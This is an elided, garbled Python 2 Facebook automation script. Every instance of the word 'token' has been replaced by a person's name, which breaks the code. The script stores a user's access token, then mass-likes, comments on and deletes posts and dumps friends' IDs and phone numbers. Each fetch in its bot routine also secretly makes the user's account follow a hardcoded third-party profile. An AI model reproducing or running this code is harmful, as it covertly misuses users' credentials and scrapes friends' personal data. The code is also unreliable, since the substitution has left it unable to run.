...
def baliho():
	try:
		Prince Yasin = open('cookie/Prince Yasin.log','r').read()
		r = requests.get('https://graph.facebook.com/me?access_Prince Yasin=' + Prince Yasin)
		a = json.loads(r.text)
		name = a['name']
		n.append(a['name'])
...
def info_ga():
  ...
  -------------       -------------------------------------
   ...
   Prince Yasin              Generate access Prince Yasin
   cat_Prince Yasin          show your access Prince Yasin
   rm_Prince Yasin           remove access Prince Yasin
...
'''%(G,W)
####################################################################
#                     GENERATE ACCESS Prince Yasin
def get(data):
	print '[*] Generate access Prince Yasin '
	...
	b = open('cookie/Prince Yasin.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_Prince Yasin'])
		b.close()
		print '[*] successfully generate access Prince Yasin'
		print '[*] Your access Prince Yasin is stored in cookie/Prince Yasin.log'
		exit()
	except KeyError:
		print '[!] Failed to generate access Prince Yasin'
		print '[!] Check your connection / email or password'
		os.remove('cookie/Prince Yasin.log')
		main()
...
#       	            BOT
	                # Execute #
def post():
	global Prince Yasin , WT

	try:
	  if WT == 'wallpost':
		print '[*] fetching all posts id'

		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_Prince Yasin='+Prince Yasin);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_Prince Yasin='+Prince Yasin)
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(500)&access_Prince Yasin='+Prince Yasin);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_Prince Yasin='+Prince Yasin)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/friendrequests?limit=50&access_Prince Yasin=' + Prince Yasin);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_Prince Yasin='+Prince Yasin)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_Prince Yasin=' + Prince Yasin);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_Prince Yasin='+Prince Yasin)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_Prince Yasin='+Prince Yasin);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_Prince Yasin='+Prince Yasin)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=albums.limit(5000)&access_Prince Yasin='+Prince Yasin);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_Prince Yasin='+Prince Yasin)
		result = json.loads(r.text)
		...
		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_Prince Yasin=%s"%(id,Prince Yasin));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_Prince Yasin='+Prince Yasin)
		result = json.loads(r.text)
...
def like(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			parameters = {'access_Prince Yasin' : Prince Yasin , 'type' : type}
...
def comment(posts , amount):
	...
	try:
		...
		for post in posts:
			...
			parameters = {'access_Prince Yasin' : Prince Yasin, 'message' : message}
...
def remove(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/{id}?method=delete&access_Prince Yasin={Prince Yasin}'.format(id=post['id'],Prince Yasin=Prince Yasin))
			a = json.loads(r.text)
...
def confirm(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/me/friends/%s?access_Prince Yasin=%s'%(post['from']['id'] , Prince Yasin))
			a = json.loads(r.text)
...
def unfollow(posts):
	...
	try:
		...
		for post in posts['data']:
			...
			r = requests.post('https://graph.facebook.com/' + post['id'] + '/subscribers?method=delete&access_Prince Yasin=' + Prince Yasin)
			a = json.loads(r.text)
...
def poke(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/%s/pokes?access_Prince Yasin=%s'%(post['id'].split('_')[0],Prince Yasin))
			a = json.loads(r.text)
...
def albums(posts):
	...
	try:
		...
		for post in posts:
			...
			r = requests.post('https://graph.facebook.com/'+post['id']+'?method=delete&access_Prince Yasin='+Prince Yasin)
			a = json.loads(r.text)
...
def menu_reaction_ask():
  try:
	...
	if cek in ['1','01']:
		...
		sys.exit()
	elif cek.lower() == 'Prince Yasin':
		try:
			open('cookie/Prince Yasin.log')
			print '[!] an access Prince Yasin already exists'
		...
		print '\n' + '[*] Generate Access Prince Yasin facebook [*]'.center(44) + '\n'
...
def bot_ask():
	global id , WT , Prince Yasin

	print '[*] load access Prince Yasin '
	try:
		Prince Yasin = open('cookie/Prince Yasin.log','r').read()
		print '[*] Success load access Prince Yasin'
	except IOError:
		print '[!] Failed load access Prince Yasin'
		print "[!] type 'Prince Yasin' to generate access Prince Yasin"
		menu_reaction_ask()
...
def bot():
  try:
	global type , message , id , WT , Prince Yasin
...
def dump_id():
	...
	try:
		...
		r = requests.get('https://graph.facebook.com/me/friends?access_Prince Yasin='+Prince Yasin)
		a = json.loads(r.text)
...
def dump_phone():
	...
	try:
		...
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_Prince Yasin="+Prince Yasin)
			z = json.loads(x.text)
...
def dump_id_id():
	...
	try:
		r = requests.get('https://graph.facebook.com/{id}?fields=friends.limit(5000)&access_Prince Yasin={Prince Yasin}'.format(id=target_id,Prince Yasin=Prince Yasin))
		a = json.loads(r.text)
...
def main():
  ...
  try:
	...
	if cek.lower() == 'get_data':
		...
		menu_bot()
		bot()
	elif cek.lower() == "cat_Prince Yasin":
		try:
			o = open('cookie/Prince Yasin.log','r').read()
			print '[*] Your access Prince Yasin !!\n\n' + o + '\n'
			main()
		except IOError:
			print '[!] failed to open cookie/Prince Yasin.log'
			print "[!] type 'Prince Yasin' to generate access Prince Yasin"
			main()
		...
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	elif cek.lower() == 'rm_Prince Yasin':
		print '''
[Warn] you must create access Prince Yasin again if 
       your access Prince Yasin is deleted
'''
		a = raw_input("[!] type 'delete' to continue : ")
		if a.lower() == 'delete':
			try:
				os.system('rm -rf cookie/Prince Yasin.log')
				print '[*] Success delete cookie/Prince Yasin.log'
				main()
			except OSError:
				print '[*] failed to delete cookie/Prince Yasin.log'
				main()
		else:
			print '[*] failed to delete cookie/Prince Yasin.log'
			main()
...
def getdata():
	...
	try:
		...
		print '[!] Your access Prince Yasin is expired'
		print "[!] type 'Prince Yasin' to generate access Prince Yasin"
		main()
